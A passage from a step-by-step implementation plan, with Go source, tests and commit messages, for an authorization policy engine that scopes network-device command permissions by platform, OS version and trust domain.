// but each ranks 2 where the simple spelling ranks 1 or 3 (spec §4). A policy
// that let them stand would buy specificity by how a rule is written rather
// than by what it constrains, so they are refused at load (spec §14, "Rank
// lint"). It recognizes the common spellings, not every equivalent regex —
// a lint, not a proof. A `(?-i)` literal is not flagged: a case-sensitive
// match is something a word cannot say.
func rankLint(body string) (simpler string, ok bool) {
	re, err := syntax.Parse("(?i)"+body, syntax.Perl)
	if err != nil {
		return "", false
	}
	re = re.Simplify()
	subs := []*syntax.Regexp{re}
	if re.Op == syntax.OpConcat {
		subs = re.Sub
	}
	begin, end := false, false
	if len(subs) > 0 && (subs[0].Op == syntax.OpBeginText || subs[0].Op == syntax.OpBeginLine) {
		begin, subs = true, subs[1:]
	}
	if n := len(subs); n > 0 && (subs[n-1].Op == syntax.OpEndText || subs[n-1].Op == syntax.OpEndLine) {
		end, subs = true, subs[:n-1]
	}
	switch {
	case len(subs) == 0 && !(begin && end):
		return "`*` (it matches every argument)", true
	case len(subs) == 1 && subs[0].Op == syntax.OpStar &&
		(subs[0].Sub[0].Op == syntax.OpAnyChar || subs[0].Sub[0].Op == syntax.OpAnyCharNotNL):
		return "`*` (it matches every argument)", true
	case begin && end && len(subs) == 1 && subs[0].Op == syntax.OpLiteral && subs[0].Flags&syntax.FoldCase != 0:
		word := strings.ToLower(string(subs[0].Rune)) // the fold-case literal is stored upper-cased
		if strings.ContainsAny(word, "*/@ \t") {
			return "", false // not writable as a word
		}
		return "the word `" + word + "`", true
	}
	return "", false
}
```

- [ ] **Step 4: Run the package**

Run: `go test ./internal/policy/ -count=1 && go vet ./internal/policy/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/policy/file.go internal/policy/load.go internal/policy/rank.go internal/policy/load_test.go
git commit -m "feat: load the policy file's full grammar

Privilege levels with parent chains, scopes, roles with pipe lists and
attributes, group and identity subjects classified by trust domain,
grants with expiry and attributes, and tests. Keys another plan reads
are refused by name (platform_set, platforms, key_groups, a role's
max_session_age); all_devices must be declared; a regex that is only a
costlier * or word is refused (spec §14, rank lint).

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 9: Scopes select devices, and attached roles follow the trust domain

**Files:**
- Create: `internal/policy/scope.go`
- Test: `internal/policy/scope_test.go`

**Interfaces:**
- Consumes: `CompareVersions` (Task 7); `Policy`, `Scope`, `Subject`, `Grant` (Task 8).
- Produces: unexported `(*Scope) selects(admission.Device) (selected, byIncomparable bool)`;
  `type composition struct { subject *Subject; grants []*Grant; roles []string; attached map[string][]string; level, ceiling string; incomparable []string }`;
  `(*Policy) compose(sub *Subject, d admission.Device, now time.Time) composition` (a zero `now`
  expires nothing, which is how load-time checks see every grant); `(*Policy) levelIndex(string) int`.
  Task 10 compiles a `composition`; Task 11's lint and Task 18's review call `selects`.

A match key reads `d.Platform` for `platform` and `d.Attributes[key]` otherwise. A missing value and
an incomparable version both resolve through `on_missing`; the second is reported (spec §5.5:
"Silent inclusion is what makes this dangerous"). Every order the composition reports is by name,
never by file position.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/policy/scope_test.go -->
```go
package policy

import (
	"strings"
	"testing"
	"time"

	"github.com/rhwendt/port49/internal/admission"
)

func deviceNamed(t *testing.T, name string) admission.Device {
	t.Helper()
	for _, d := range inventory() {
		if d.Name == name {
			return d
		}
	}
	t.Fatalf("no device %s", name)
	return admission.Device{}
}

// scoped is spec §11's scopes and the roles they attach, with one grant per
// subject on each scope that matters.
const scoped = `
scopes:
  - {name: all_devices, match: {}}
  - {name: dc_fabric, match: {site: [dc1, dc2], role: [leaf, spine]}}
  - name: srx_unpatched
    match: {platform: juniper_junos, os_version: {lt: "21.4R3-S5"}}
    on_missing: include
    security_log: true
    attached_roles: {humans: [cve_2026_xxxx], machines: [cve_2026_xxxx_machines]}
  - {name: eos_only, match: {platform: arista_eos, site: {re: "^dc"}}}
roles:
  - {name: read_only, privilege: readonly, permit: [show **]}
  - {name: dc_admin, privilege: admin, permit: ["**"]}
  - {name: cve_2026_xxxx, deny: [show chassis cluster **]}
  - {name: cve_2026_xxxx_machines, deny: [show chassis cluster **]}
subjects:
  - {name: noc, identity: "user:noc@example.com", username: noc, token_ttl: 60s}
  - {name: svc, identity: "app:backup", username: svc-backup, token_ttl: 60s}
  - {name: temp, identity: "user:temp@example.com", username: temp, token_ttl: 60s}
  - {name: idle, identity: "user:idle@example.com", username: idle, token_ttl: 60s}
grants:
  - {subject: noc, scope: all_devices, roles: [read_only]}
  - {subject: noc, scope: dc_fabric, roles: [dc_admin], max_privilege: admin}
  - {subject: svc, scope: all_devices, roles: [read_only]}
  - {subject: temp, scope: eos_only, roles: [read_only], expires: "2026-10-01T00:00:00Z"}
`

func composed(t *testing.T, p *Policy, subject, device string, now time.Time) composition {
	t.Helper()
	s, ok := p.Subject(subject)
	if !ok {
		t.Fatalf("no subject %s", subject)
	}
	return p.compose(s, deviceNamed(t, device), now)
}

// Roles are the union across the grants whose scope selects the device, the
// level is the max over them, and the ceiling the max over the grants (spec
// §5.1).
func TestAPrincipalHoldsTheGrantsWhoseScopeSelectsTheDevice(t *testing.T) {
	p := mustParse(t, scoped)
	c := composed(t, p, "noc", "leaf-01", time.Time{})
	if strings.Join(c.roles, ",") != "dc_admin,read_only" || c.level != "admin" || c.ceiling != "admin" ||
		len(c.grants) != 2 || c.grants[0].Scope != "all_devices" {
		t.Fatalf("noc on leaf-01: %+v", c)
	}
	c = composed(t, p, "noc", "campus-sw-7", time.Time{})
	if strings.Join(c.roles, ",") != "read_only" || c.level != "readonly" || c.ceiling != "" {
		t.Fatalf("noc on a campus switch: %+v", c)
	}
}

// Attached roles compose into a grant for the principal's trust domain only,
// and never create access (spec §5.5; §14, "Attached roles").
func TestAttachedRolesFollowTheTrustDomainAndNeverAddADevice(t *testing.T) {
	p := mustParse(t, scoped)
	human := composed(t, p, "noc", "srx-fw-04", time.Time{})
	if strings.Join(human.roles, ",") != "cve_2026_xxxx,read_only" ||
		strings.Join(human.attached["cve_2026_xxxx"], ",") != "srx_unpatched" {
		t.Fatalf("a human on an unpatched SRX: %+v", human)
	}
	machine := composed(t, p, "svc", "srx-fw-04", time.Time{})
	if strings.Join(machine.roles, ",") != "cve_2026_xxxx_machines,read_only" {
		t.Fatalf("a machine on an unpatched SRX gets the machines list: %+v", machine)
	}
	if c := composed(t, p, "idle", "srx-fw-04", time.Time{}); len(c.grants) != 0 || len(c.roles) != 0 {
		t.Fatalf("no declared grant, so the attached role attaches to nothing: %+v", c)
	}
}

// A version the comparator cannot order is a missing one: included by a
// scope that says on_missing: include, and reported as such (spec §5.5). A
// device leaving the scope on the next sync regains the command with no policy
// change (§14, "State-scoped mitigation").
func TestAnIncomparableVersionIsIncludedAndSaysSo(t *testing.T) {
	p := mustParse(t, scoped)
	s := p.scopes["srx_unpatched"]
	for _, tt := range []struct {
		device             string
		selected, reported bool
	}{
		{"srx-fw-04", true, false},  // 21.4R3-S4 < 21.4R3-S5
		{"srx-fw-05", false, false}, // 22.2R1: patched, out of the scope
		{"srx-fw-22", true, true},   // 21.4X75-D40 cannot be ordered against 21.4R3-S5
		{"srx-lab-01", true, false}, // no os_version at all: on_missing
		{"leaf-01", false, false},   // wrong platform
	} {
		sel, rep := s.selects(deviceNamed(t, tt.device))
		if sel != tt.selected || rep != tt.reported {
			t.Errorf("%s: selected %v reported %v, want %v %v", tt.device, sel, rep, tt.selected, tt.reported)
		}
	}
	if c := composed(t, p, "noc", "srx-fw-22", time.Time{}); strings.Join(c.incomparable, ",") != "srx_unpatched" {
		t.Errorf("the composition says which scope took the device in on an incomparable version: %+v", c.incomparable)
	}
	if c := composed(t, p, "noc", "srx-fw-04", time.Time{}); len(c.incomparable) != 0 {
		t.Errorf("a comparable version is not reported: %+v", c.incomparable)
	}
	patched := deviceNamed(t, "srx-fw-04")
	patched.Attributes = map[string]string{"os_version": "21.4R3-S5"}
	if sel, _ := s.selects(patched); sel {
		t.Error("the upgrade lifts the mitigation for that device alone")
	}
}

// A permit-bearing scope excludes what it cannot see, the safe direction for
// a grant (spec §5.5), and on_missing defaults to exclude where no deny is
// attached.
func TestOnMissingExcludesByDefault(t *testing.T) {
	p := mustParse(t, scoped)
	if sel, _ := p.scopes["dc_fabric"].selects(deviceNamed(t, "srx-lab-01")); sel {
		t.Fatal("a device with no site is not in dc_fabric")
	}
	if p.scopes["dc_fabric"].OnMissing != "exclude" {
		t.Fatal("the default is exclude")
	}
	if sel, _ := p.scopes["eos_only"].selects(deviceNamed(t, "leaf-01")); !sel {
		t.Fatal("platform and a regex on site both hold on leaf-01")
	}
}

// A grant that has expired stops matching; `expires` is the grant's, not the
// subject's (spec §5.1).
func TestAnExpiredGrantMatchesNothing(t *testing.T) {
	p := mustParse(t, scoped)
	before := time.Date(2026, 9, 30, 23, 59, 0, 0, time.UTC)
	if c := composed(t, p, "temp", "leaf-01", before); len(c.grants) != 1 {
		t.Fatalf("before expiry: %+v", c)
	}
	if c := composed(t, p, "temp", "leaf-01", before.Add(time.Minute)); len(c.grants) != 0 {
		t.Fatalf("at expiry: %+v", c)
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/policy/ -count=1`
Expected: FAIL to build — `undefined: composition`, and `p.compose` and `s.selects` undefined.

- [ ] **Step 3: Write scope selection and composition**

<!-- write: internal/policy/scope.go -->
```go
package policy

import (
	"slices"
	"sort"
	"strings"
	"time"

	"github.com/rhwendt/port49/internal/admission"
)

// selects reports whether the scope selects the device (spec §5.5): every
// match key must hold. A key the device has no value for resolves through
// on_missing, and so does a version the comparator cannot order — an
// incomparable version is treated exactly as a missing one, so a device
// whose patch level cannot be determined is assumed unpatched by a
// deny-bearing scope. byIncomparable reports a selection that happened only
// because of that, which spec §5.5 requires be reported, never silent.
func (s *Scope) selects(d admission.Device) (selected, byIncomparable bool) {
	keys := make([]string, 0, len(s.Match))
	for k := range s.Match {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, key := range keys {
		value, present := d.Attributes[key]
		if key == "platform" {
			value, present = d.Platform, d.Platform != ""
		}
		if !present {
			if s.OnMissing != "include" {
				return false, false
			}
			continue
		}
		hit, comparable := s.matches(key, value)
		if !comparable {
			if s.OnMissing != "include" {
				return false, false
			}
			byIncomparable = true
			continue
		}
		if !hit {
			return false, false
		}
	}
	return true, byIncomparable
}

// matches tests one present value against one match term. comparable is
// false only when a version comparison could not order the two.
func (s *Scope) matches(key, value string) (hit, comparable bool) {
	m := s.Match[key]
	if m.Equal != nil {
		return slices.Contains(m.Equal, value), true
	}
	for op, bound := range m.Cmp {
		if op == "re" {
			if !s.res[key].MatchString(value) {
				return false, true
			}
			continue
		}
		c, ok := CompareVersions(value, bound)
		if !ok {
			return false, false
		}
		var holds bool
		switch op {
		case "lt":
			holds = c < 0
		case "lte":
			holds = c <= 0
		case "gt":
			holds = c > 0
		case "gte":
			holds = c >= 0
		}
		if !holds {
			return false, true
		}
	}
	return true, true
}

// composition is what one subject holds on one device (spec §5.1, §5.5): the
// declared grants whose scope selects the device and that have not expired,
// the union of their roles with every role a selecting scope attaches for the
// subject's trust domain, the level the roles compose to, and the ceiling the
// grants compose to.
type composition struct {
	subject  *Subject
	grants   []*Grant
	roles    []string            // sorted
	attached map[string][]string // role → the scopes that attached it, for explain
	level    string
	ceiling  string
	// incomparable names every selecting scope that selected the device only
	// because a version could not be compared (spec §5.5: reported, never
	// silent).
	incomparable []string
}

// compose resolves sub on d at now. No selecting grant is an empty
// composition: attached roles have nothing to attach to, and never create
// access (spec §5.5). A zero now expires nothing, which is how the load-time
// checks see every grant.
func (p *Policy) compose(sub *Subject, d admission.Device, now time.Time) composition {
	c := composition{subject: sub, attached: map[string][]string{}}
	for _, g := range p.grants {
		if g.Subject != sub.Name {
			continue
		}
		if !g.Expires.IsZero() && !now.IsZero() && !now.Before(g.Expires) {
			continue
		}
		if ok, _ := p.scopes[g.Scope].selects(d); ok {
			c.grants = append(c.grants, g)
		}
	}
	if len(c.grants) == 0 {
		return c
	}
	// One order for everything a composition reports, independent of the
	// file's: which grant supplied an attribute is decided by it (spec §5.4).
	sort.SliceStable(c.grants, func(i, j int) bool {
		a, b := c.grants[i], c.grants[j]
		if a.Scope != b.Scope {
			return a.Scope < b.Scope
		}
		return strings.Join(a.Roles, ",") < strings.Join(b.Roles, ",")
	})
	roles := map[string]bool{}
	for _, g := range c.grants {
		for _, r := range g.Roles {
			roles[r] = true
		}
		if p.levelIndex(g.MaxPrivilege) > p.levelIndex(c.ceiling) {
			c.ceiling = g.MaxPrivilege
		}
	}
	names := make([]string, 0, len(p.scopes))
	for name := range p.scopes {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		s := p.scopes[name]
		ok, byIncomparable := s.selects(d)
		if !ok {
			continue
		}
		if byIncomparable && (len(s.Attached[sub.Domain]) > 0 || c.grantsOn(name)) {
			c.incomparable = append(c.incomparable, name)
		}
		for _, r := range s.Attached[sub.Domain] {
			roles[r] = true
			c.attached[r] = append(c.attached[r], name)
		}
	}
	for r := range roles {
		c.roles = append(c.roles, r)
		if p.levelIndex(p.roles[r].Privilege) > p.levelIndex(c.level) {
			c.level = p.roles[r].Privilege
		}
	}
	sort.Strings(c.roles)
	return c
}

// grantsOn reports whether one of the composition's grants is on scope.
func (c composition) grantsOn(scope string) bool {
	for _, g := range c.grants {
		if g.Scope == scope {
			return true
		}
	}
	return false
}

// levelIndex is a level's place in the declared ordering, which is what the
// max-join uses (spec §6); "" is below every level.
func (p *Policy) levelIndex(level string) int {
	if level == "" {
		return -1
	}
	return slices.Index(p.levels, level)
}
```

- [ ] **Step 4: Run the package**

Run: `go test ./internal/policy/ -count=1`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/policy/scope.go internal/policy/scope_test.go
git commit -m "feat: scopes select devices and attach roles by trust domain

A grant applies where its scope selects the device and it has not
expired; roles are the union with every role a selecting scope attaches
for the subject's domain, and attach to nothing without a declared
grant (spec §5.5; decision 18). An incomparable version is a missing
one, and says so.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---
### Task 10: Resolve a principal on a device, compile its blob, and check every device at load

**Files:**
- Create: `internal/policy/resolve.go`
- Modify: `internal/policy/load.go` (`Parse` runs the joint checks)
- Test: `internal/policy/resolve_test.go`

**Interfaces:**
- Consumes: `compose` (Task 9); `engine.Blob`, `engine.Rule`, `engine.Normalize` (Task 5);
  `platform.Dialect.Render`, `PrivLvl`, `EntityClasses` (Task 4); `decision.PolicyGrant`,
  `decision.FormatTime` (Task 2).
- Produces:
  - `var ErrNoGrants`.
  - `type Resolution struct { Subject, Username, Enable string; TokenTTL time.Duration; Level, Ceiling string; MaxPrivilege uint8; Grants []decision.PolicyGrant; Roles []string; Attached map[string][]string; Incomparable []string; Blob engine.Blob; Attributes []AttributeSource }`;
    `type AttributeSource struct { Attribute, Source string; Shadows []string }`.
  - `func (*Policy) Resolve(principal string, d admission.Device, now time.Time) (Resolution, error)`;
    `func (*Policy) ResolveSubject(subject string, d admission.Device, now time.Time) (Resolution, error)`.
  - unexported `compile`, `layerAttributes`, `render`, `privLvl`, `checkDevices`.
  Task 13's broker calls `Resolve`; Task 11's `Decide` and Task 15's `Explain` call both.

Spec §5.1's pipeline, end to end: subjects → grants (scope selects the device, not expired) → roles
(union, plus attached) → privilege (max over the declared order) → `max_privilege` (max over the
grants, as this platform's `priv-lvl` number; zero is no ceiling) → rules → attributes rendered for
the platform. `checkDevices` runs that for every subject on every device in the inventory at load
(Decided 8), which is what lets the broker treat a compile failure at a mint as its own defect.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/policy/resolve_test.go -->
```go
package policy

import (
	"errors"
	"reflect"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/rhwendt/port49/internal/engine"
	"github.com/rhwendt/port49/internal/platform"
)

var noon = time.Date(2026, 9, 23, 12, 0, 0, 0, time.UTC)

// Spec §5.1 end to end for one principal on one device: the subject, the
// grants that selected it, the roles, the ceiling as the platform's number, and
// a blob that encodes — the rules carry their roles, the pipe list is the
// default, and the session reply is the platform's rendering of the level.
func TestResolveComposesAndCompiles(t *testing.T) {
	p := mustParse(t, good)
	r, err := p.Resolve("user:alice@example.com", deviceNamed(t, "leaf-01"), noon)
	if err != nil {
		t.Fatal(err)
	}
	if r.Subject != "alice" || r.Username != "alice" || r.Enable != "token" || r.TokenTTL != time.Minute ||
		r.Level != "readonly" || r.MaxPrivilege != 0 || strings.Join(r.Roles, ",") != "no_disruptive,read_only" {
		t.Fatalf("resolution: %+v", r)
	}
	if len(r.Grants) != 1 || r.Grants[0].Scope != "all_devices" || r.Grants[0].Expires != "2026-12-01T00:00:00.000Z" {
		t.Fatalf("the mint record's grants: %+v", r.Grants)
	}
	b := r.Blob
	if b.Platform != "arista_eos" || b.Bundle != p.Bundle || b.Privilege != "readonly" ||
		!reflect.DeepEqual(b.Attributes, []string{"priv-lvl=1"}) || !reflect.DeepEqual(b.Pipe, sortedCopy(DefaultPipe)) ||
		b.Normalize.PipeToken != "|" || b.Normalize.PipeAuthorized || b.Normalize.ExpandsAbbreviations {
		t.Fatalf("blob: %+v", b)
	}
	if len(b.Rules) != 4 || b.Rules[0] != (engine.Rule{Verdict: engine.Deny, Rule: "reload **", Role: "no_disruptive"}) {
		t.Fatalf("rules: %+v", b.Rules)
	}
	if _, _, err := engine.Encode(b); err != nil {
		t.Fatalf("the blob must encode: %v", err)
	}
	if _, err := p.Resolve("user:mallory@example.com", deviceNamed(t, "leaf-01"), noon); !errors.Is(err, ErrNoGrants) {
		t.Fatalf("a principal no subject lists: %v", err)
	}
	if _, err := p.Resolve("user:alice@example.com", deviceNamed(t, "leaf-01"), time.Date(2026, 12, 1, 0, 0, 0, 0, time.UTC)); !errors.Is(err, ErrNoGrants) {
		t.Fatalf("an expired grant: %v", err)
	}
}

func sortedCopy(s []string) []string {
	out := slices.Clone(s)
	slices.Sort(out)
	return out
}

// A platform that renders no level sends no attributes, and still numbers the
// ceiling for the token (plan 3's table); a group subject resolves by name
// only, since matching a person to a group is the directory's (plan 7).
func TestAPlatformThatRendersNothingStillHasACeiling(t *testing.T) {
	p := mustParse(t, good)
	if _, err := p.Resolve("CN=netops-admins,OU=Groups,DC=example,DC=com", deviceNamed(t, "nx-01"), noon); !errors.Is(err, ErrNoGrants) {
		t.Fatalf("a group is never a principal: %v", err)
	}
	r, err := p.ResolveSubject("netops_admins", deviceNamed(t, "nx-01"), noon)
	if err != nil {
		t.Fatal(err)
	}
	if r.MaxPrivilege != 15 || r.Level != "admin" || len(r.Blob.Attributes) != 0 ||
		!reflect.DeepEqual(r.Blob.Pipe, []string{"**"}) {
		t.Fatalf("netops_admins on NX-OS: %+v", r)
	}
	if _, err := p.ResolveSubject("nobody", deviceNamed(t, "nx-01"), noon); err == nil {
		t.Fatal("an undeclared subject is an error")
	}
}

// One decision, one blob: two subjects holding the same roles on the same
// platform compile to the same bytes, whatever order their grants list the
// roles in (spec §5.1.1).
func TestTheSameCompositionIsTheSameBlob(t *testing.T) {
	p := mustParse(t, `
scopes: [{name: all_devices, match: {}}]
roles:
  - {name: a, permit: ["show  version", show **]}
  - {name: b, permit: [show **], deny: [reload **]}
subjects:
  - {name: s, identity: "user:s@example.com", username: s, token_ttl: 60s}
  - {name: t, identity: "user:t@example.com", username: t, token_ttl: 60s}
grants:
  - {subject: s, scope: all_devices, roles: [a, b]}
  - {subject: t, scope: all_devices, roles: [b]}
  - {subject: t, scope: all_devices, roles: [a]}
`)
	s, _ := p.Resolve("user:s@example.com", deviceNamed(t, "leaf-01"), noon)
	u, _ := p.Resolve("user:t@example.com", deviceNamed(t, "leaf-01"), noon)
	_, h1, err1 := engine.Encode(s.Blob)
	_, h2, err2 := engine.Encode(u.Blob)
	if err1 != nil || err2 != nil || h1 != h2 {
		t.Fatalf("one decision, two blobs: %s %s %v %v", h1, h2, err1, err2)
	}
	nx, _ := p.Resolve("user:s@example.com", deviceNamed(t, "nx-01"), noon)
	if _, h3, _ := engine.Encode(nx.Blob); h3 == h1 {
		t.Fatal("two platforms must not share a blob")
	}
}

// Spec §6: platform → role → grant, most specific winning by attribute name,
// every override recorded, a parent chain rendering a custom level.
func TestAttributesLayerAndRecordWhatTheyShadow(t *testing.T) {
	p := mustParse(t, `
privilege_levels: [{name: readonly}, {name: read_only_limited, parent: readonly}, {name: operator}, {name: admin}]
scopes: [{name: all_devices, match: {}}, {name: dc_fabric, match: {site: dc1}}]
roles:
  - {name: limited, privilege: read_only_limited, permit: [show version],
     attributes: {all: ["idletime*30", "timeout*480"], arista_eos: ["priv-lvl=2"]}}
  - {name: homes, attributes: {all: ["home-directory*/home/{username}", "idletime*10"]}}
subjects:
  - {name: s, identity: "user:s@example.com", username: s, token_ttl: 60s}
grants:
  - {subject: s, scope: all_devices, roles: [limited, homes]}
  - {subject: s, scope: dc_fabric, roles: [limited], attributes: {arista_eos: ["timeout*60"]}}
`)
	r, err := p.Resolve("user:s@example.com", deviceNamed(t, "leaf-01"), noon)
	if err != nil {
		t.Fatal(err)
	}
	// Order is first appearance — platform, then roles by name, then grants —
	// with an override taking the place of what it shadows.
	want := []string{"priv-lvl=2", "home-directory*/home/{username}", "idletime*30", "timeout*60"}
	if !reflect.DeepEqual(r.Blob.Attributes, want) {
		t.Fatalf("attributes %q, want %q", r.Blob.Attributes, want)
	}
	byName := map[string]AttributeSource{}
	for _, a := range r.Attributes {
		byName[engine.AttributeName(a.Attribute)] = a
	}
	if a := byName["priv-lvl"]; a.Source != "role limited" || len(a.Shadows) != 1 ||
		a.Shadows[0] != "priv-lvl=1 (platform arista_eos, level readonly)" {
		t.Errorf("the role shadows the platform's rendering of the parent level: %+v", a)
	}
	if a := byName["idletime"]; a.Source != "role limited" || a.Shadows[0] != "idletime*10 (role homes)" {
		t.Errorf("within the role layer, roles are taken by name: %+v", a)
	}
	if a := byName["timeout"]; !strings.HasPrefix(a.Source, "grant dc_fabric") || len(a.Shadows) != 1 {
		t.Errorf("the grant is the most specific layer: %+v", a)
	}
}

// The joint checks: a policy is refused at load, naming the subject, the
// device and the reason, when a mint on some device in inventory could not
// compile or would contradict itself (spec §4, §5.6, §6).
func TestJointChecksRefuseAtLoad(t *testing.T) {
	for _, tt := range []struct{ name, yaml, want string }{
		{"a class the platform does not define", `
scopes: [{name: all_devices, match: {}}]
roles: [{name: tech, permit: [interface @physical]}]
subjects: [{name: s, identity: "user:s@example.com", username: s, token_ttl: 60s}]
grants: [{subject: s, scope: all_devices, roles: [tech]}]`, `role "tech" names @physical, which cisco_nxos does not define`},
		{"a level the platform cannot render", `
scopes: [{name: all_devices, match: {}}]
roles: [{name: op, privilege: operator, permit: [show **]}]
subjects: [{name: s, identity: "user:s@example.com", username: s, token_ttl: 60s}]
grants: [{subject: s, scope: all_devices, roles: [op]}]`, "level operator has no rendering on arista_eos"},
		{"a ceiling with no number", `
scopes: [{name: all_devices, match: {}}]
roles: [{name: ro, privilege: readonly, permit: [show **]}]
subjects: [{name: s, identity: "user:s@example.com", username: s, token_ttl: 60s}]
grants: [{subject: s, scope: all_devices, roles: [ro], max_privilege: operator}]`, "max_privilege operator has no priv-lvl"},
		{"a landing level above the ceiling", `
scopes: [{name: all_devices, match: {}}]
roles: [{name: adm, privilege: admin, permit: ["**"]}]
subjects: [{name: s, identity: "user:s@example.com", username: s, token_ttl: 60s}]
grants: [{subject: s, scope: all_devices, roles: [adm], max_privilege: readonly}]`, "above its grants' max_privilege"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Parse([]byte(tt.yaml), env())
			if err == nil || !strings.Contains(err.Error(), tt.want) || !strings.Contains(err.Error(), `subject "s"`) {
				t.Fatalf("Parse = %v, want an error naming subject s and containing %q", err, tt.want)
			}
		})
	}
	// A class only EOS defines is fine on a scope that selects only EOS: the
	// check is per device, not per policy.
	mustParse(t, `
scopes: [{name: eos, match: {platform: arista_eos}}]
roles: [{name: tech, permit: [interface @physical]}]
subjects: [{name: s, identity: "user:s@example.com", username: s, token_ttl: 60s}]
grants: [{subject: s, scope: eos, roles: [tech]}]`)
}

// `enable: auto` is refused at load on a platform whose enable exchange does
// not carry the principal (spec §5.6; §14). config.Load refuses such a
// platform today, so the check is exercised with a table that says otherwise.
func TestEnableAutoIsRefusedWhereTheEnableUsernameIsNotThePrincipal(t *testing.T) {
	body := `
scopes: [{name: all_devices, match: {}}]
roles: [{name: ro, privilege: readonly, permit: [show **]}]
subjects: [{name: s, identity: "user:s@example.com", username: s, enable: auto, token_ttl: 60s}]
grants: [{subject: s, scope: all_devices, roles: [ro]}]`
	e := env()
	if _, err := Parse([]byte(body), e); err != nil {
		t.Fatalf("every shipped platform carries the principal: %v", err)
	}
	e.EnableUsernames = map[string]string{"arista_eos": platform.EnableEnab}
	if _, err := Parse([]byte(body), e); err == nil || !strings.Contains(err.Error(), "enable: auto reaches device") {
		t.Fatalf("Parse = %v", err)
	}
}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/policy/ -count=1`
Expected: FAIL to build — `p.Resolve undefined`, `undefined: ErrNoGrants`, `undefined: AttributeSource`.

- [ ] **Step 3: Write resolution and compilation, and run the joint checks at load**

<!-- write: internal/policy/resolve.go -->
```go
package policy

import (
	"errors"
	"fmt"
	"slices"
	"sort"
	"strings"
	"time"

	"github.com/rhwendt/port49/internal/admission"
	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/engine"
	"github.com/rhwendt/port49/internal/platform"
)

// ErrNoGrants is no_grants_matched: no subject lists the principal, or no
// declared grant of its subject selects the device (spec §5.1, §5.5). The mint
// answers it the same either way (design §17).
var ErrNoGrants = errors.New("policy: no declared grant for this principal selects the device")

// Resolution is what one mint, one explanation or one policy test needs from
// policy for one principal on one device (spec §5.1).
type Resolution struct {
	Subject, Username, Enable string
	TokenTTL                  time.Duration
	// Level is the level the roles compose to; Ceiling the max_privilege the
	// grants compose to. MaxPrivilege is Ceiling as this platform's priv-lvl
	// number, the form the token and the daemon compare; zero is no ceiling.
	Level, Ceiling string
	MaxPrivilege   uint8
	// Grants are the grants that selected the device, for the mint record.
	Grants []decision.PolicyGrant
	// Roles are every role that composed, attached ones included; Attached
	// says which scope attached each attached one.
	Roles    []string
	Attached map[string][]string
	// Incomparable names scopes that selected the device only because a
	// version could not be compared (spec §5.5).
	Incomparable []string
	// Blob is the compiled decision; Attributes says where each of its
	// attributes came from and what it shadowed (spec §6).
	Blob       engine.Blob
	Attributes []AttributeSource
}

// AttributeSource is one attribute of the session reply and its provenance:
// the platform's level, a role, or a grant, and every value it overrode
// (spec §6, "Diagnosing an unfamiliar vendor").
type AttributeSource struct {
	Attribute string
	Source    string
	Shadows   []string
}

// Resolve evaluates spec §5.1 for a principal on a device at now: the subject
// its identity names, the grants whose scope selects the device and that
// have not expired, every role they and the device's scopes carry, and the
// compiled blob.
func (p *Policy) Resolve(principal string, d admission.Device, now time.Time) (Resolution, error) {
	name, ok := p.byID[principal]
	if !ok {
		return Resolution{}, ErrNoGrants
	}
	return p.resolve(p.subs[name], d, now)
}

// ResolveSubject is Resolve for a subject named directly, as the offline
// tools name them: a group subject has no identity to resolve by until plan 7
// reads the directory.
func (p *Policy) ResolveSubject(subject string, d admission.Device, now time.Time) (Resolution, error) {
	sub, ok := p.subs[subject]
	if !ok {
		return Resolution{}, fmt.Errorf("policy: subject %q is not declared", subject)
	}
	return p.resolve(sub, d, now)
}

func (p *Policy) resolve(sub *Subject, d admission.Device, now time.Time) (Resolution, error) {
	c := p.compose(sub, d, now)
	if len(c.grants) == 0 {
		return Resolution{}, ErrNoGrants
	}
	res := Resolution{Subject: sub.Name, Username: sub.Username, Enable: sub.Enable, TokenTTL: sub.TokenTTL,
		Level: c.level, Ceiling: c.ceiling, Roles: c.roles, Attached: c.attached, Incomparable: c.incomparable}
	for _, g := range c.grants {
		pg := decision.PolicyGrant{Scope: g.Scope, Roles: append([]string(nil), g.Roles...)}
		if !g.Expires.IsZero() {
			pg.Expires = decision.FormatTime(g.Expires)
		}
		res.Grants = append(res.Grants, pg)
	}
	dialect := p.dialect(d.Platform)
	if c.ceiling != "" {
		n, ok := p.privLvl(dialect, c.ceiling)
		if !ok {
			return Resolution{}, fmt.Errorf("max_privilege %s has no priv-lvl number on %s; the token's ceiling "+
				"cannot be stated to the daemon", c.ceiling, d.Platform)
		}
		res.MaxPrivilege = n
	}
	var err error
	res.Blob, res.Attributes, err = p.compile(c, d, dialect)
	return res, err
}

// compile turns a composition into the blob for one platform (spec §5.1.2):
// every role's rules, each carrying its role; the pipe allowlist of every
// role that permits anything; the patterns behind every class a rule names,
// as this platform defines them; and the session attributes, layered.
func (p *Policy) compile(c composition, d admission.Device, dialect platform.Dialect) (engine.Blob, []AttributeSource, error) {
	b := engine.Blob{Version: engine.Version, Bundle: p.Bundle, Platform: d.Platform, Privilege: c.level,
		Normalize: engine.Normalize{PipeToken: dialect.PipeToken, PipeAuthorized: dialect.PipeAuthorized,
			StripCR: dialect.StripCR, ExpandsAbbreviations: dialect.ExpandsAbbreviations},
		Classes: map[string][]string{}}
	pipe := map[string]bool{}
	for _, name := range c.roles {
		r := p.roles[name]
		for _, rule := range r.Permit {
			b.Rules = append(b.Rules, engine.Rule{Verdict: engine.Permit, Rule: rule, Role: name})
		}
		for _, rule := range r.Deny {
			b.Rules = append(b.Rules, engine.Rule{Verdict: engine.Deny, Rule: rule, Role: name})
		}
		// A role that permits nothing contributes no pipe list, or a deny-only
